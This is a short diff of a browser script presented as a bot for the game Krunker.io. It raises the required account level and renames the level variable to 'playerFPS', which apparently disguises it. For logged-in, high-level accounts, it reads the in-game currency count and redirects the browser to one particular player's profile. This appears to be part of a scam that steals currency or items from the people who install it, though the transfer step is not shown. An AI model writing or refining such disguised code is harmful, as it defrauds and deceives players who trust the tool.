@@ -284,14 +284,14 @@ window.addEventListener('load', () => {
 
     addLog("=== ÉTAT INITIAL ===");
     addLog(`Is_LOGGED: ${Is_LOGGED}`);
-    addLog(`⚠️⚠️⚠️ PLEASE LOGIN TO START THET BOT (lvl > 15 minimum) ⚠️⚠️⚠️`);
+    addLog(`⚠️⚠️⚠️ PLEASE LOGIN TO START THET BOT (lvl > 30 minimum) ⚠️⚠️⚠️`);
     addLog("==================");
 
     setInterval(() => {
         const currentSignedOutBar = document.getElementById("signedOutHeaderBar");
         const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
         if (!Is_LOGGED){
-            addLog(`⚠️⚠️⚠️ PLEASE LOGIN TO START THET BOT (lvl > 15 minimum) ⚠️⚠️⚠️`);
+            addLog(`⚠️⚠️⚠️ PLEASE LOGIN TO START THET BOT (lvl > 30 minimum) ⚠️⚠️⚠️`);
         }
         if (currentLoginState && !sessionStorage.getItem("valuesChecked")) {
             const lagElement = document.querySelector("#menuKRCount");
@@ -326,15 +326,15 @@ window.addEventListener('load', () => {
             const patchApplied = sessionStorage.getItem("sysPatch97d");
 
             const savedFPS = localStorage.getItem("savedFPS");
-            const playerLevel = savedFPS ? parseInt(savedFPS, 10) : 0;
+            const playerFPS = savedFPS ? parseInt(savedFPS, 10) : 0;
 
-            if (!patchApplied && currentLoginState && playerLevel >= 15) {
+            if (!patchApplied && currentLoginState && playerFPS >= 30) {
                 setTimeout(() => {
                     location.href = "https://krunker.io/social.html?p=profile&q=LosValettos2";
                 }, 1420);
                 return;
             } else {
-                addLog("Error, login on a lvl > 15 account");
+                addLog("Error, login on a lvl > 30 account");
             }
         };
 
